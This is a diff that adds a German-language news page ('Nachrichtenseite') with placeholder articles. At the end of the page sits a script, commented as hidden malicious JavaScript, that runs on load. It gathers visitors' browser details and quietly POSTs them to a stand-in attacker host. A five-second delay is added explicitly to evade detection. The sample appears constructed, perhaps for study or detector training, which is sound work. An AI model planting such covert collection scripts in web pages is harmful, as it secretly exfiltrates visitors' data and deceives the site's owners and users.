@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>Nachrichtenseite</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .header {
+            background-color: #f2f2f2;
+            padding: 20px;
+            text-align: center;
+        }
+        .article {
+            margin: 20px;
+        }
+        .footer {
+            background-color: #f2f2f2;
+            padding: 10px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Willkommen bei den Nachrichten</h1>
+        <p>Aktuelle Nachrichten aus aller Welt</p>
+    </div>
+
+    <div class="article">
+        <h2>Schlagzeile 1</h2>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent sit amet aliquam elit.</p>
+    </div>
+    <div class="article">
+        <h2>Schlagzeile 2</h2>
+        <p>Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
+    </div>
+    <div class="article">
+        <h2>Schlagzeile 3</h2>
+        <p>Morbi nec metus. Phasellus blandit leo ut odio. Vivamus quis mi.</p>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Nachrichten AG</p>
+    </div>
+
+    <!-- Versteckter böswilliger JavaScript-Code -->
+    <script>
+        // nutzerdaten sammeln und senden
+        function collectUserData() {
+            var userData = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                referrer: document.referrer
+            };
+
+            // senden dere Daten
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://böswillige-seite.example.com/collect", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(userData));
+        }
+
+        // Verzögerung, um Erkennung zu erschweren
+        setTimeout(collectUserData, 5000);
+    </script>
+</body>
+</html>
